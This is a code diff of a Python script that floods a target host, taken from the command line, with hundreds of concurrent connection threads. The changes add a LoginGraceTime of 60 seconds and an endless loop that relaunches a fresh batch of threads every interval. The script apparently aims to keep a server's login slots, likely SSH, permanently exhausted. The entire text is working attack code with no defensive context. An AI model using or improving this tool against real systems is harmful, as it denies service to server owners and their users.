@@ -6,8 +6,8 @@ from time import sleep
 import _thread as thread
 
 HOST = argv[1]
-USERNAME = 'root'
-CONCURRENT = 1000
+CONCURRENT = 600
+LoginGraceTime = 60
 
 try:
     CONCURRENT = int(argv[2])
@@ -31,10 +31,15 @@ def go():
             count += 1
             pass
 
-
-if __name__ == "__main__":
+def threadStarter():
     for i in range(CONCURRENT):
         thread.start_new_thread(go, ())
+        sleep(0.01)
+
+if __name__ == "__main__":
+    while True:
+        thread.start_new_thread(threadStarter, ())
+        sleep(LoginGraceTime)
         #sleep(0.1)
         
     sleep(2147483647)
